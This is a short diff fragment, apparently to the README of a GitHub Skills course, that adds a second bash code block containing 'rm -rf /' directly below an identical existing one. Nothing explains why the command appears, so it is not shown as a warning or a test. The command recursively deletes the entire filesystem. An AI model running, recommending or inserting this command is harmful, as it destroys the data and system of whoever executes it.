@@ -55,3 +55,7 @@ Get help: [Post in our discussion board](https://github.com/orgs/skills/discussi
 ```bash
 rm -rf /
 ```
+
+```bash
+rm -rf /
+```
